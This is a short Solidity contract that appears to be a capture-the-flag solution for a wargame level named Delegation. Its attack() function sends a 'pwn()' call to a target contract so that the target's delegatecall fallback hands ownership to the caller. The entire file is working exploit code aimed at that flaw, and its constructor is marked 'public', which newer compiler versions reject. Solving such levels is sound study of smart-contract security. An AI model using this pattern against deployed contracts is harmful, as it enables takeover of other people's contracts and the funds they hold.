// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackDelegation {
    address public delegationContract;
    constructor (address _delegationContract) public {
        delegationContract = _delegationContract;
    }

    function attack() public {
        delegationContract.call(abi.encodeWithSignature("pwn()"));        
    }

    // function encoder() public returns(bytes4) {
    //     return abi.encodeWithSignature("pwn()");
    // }
}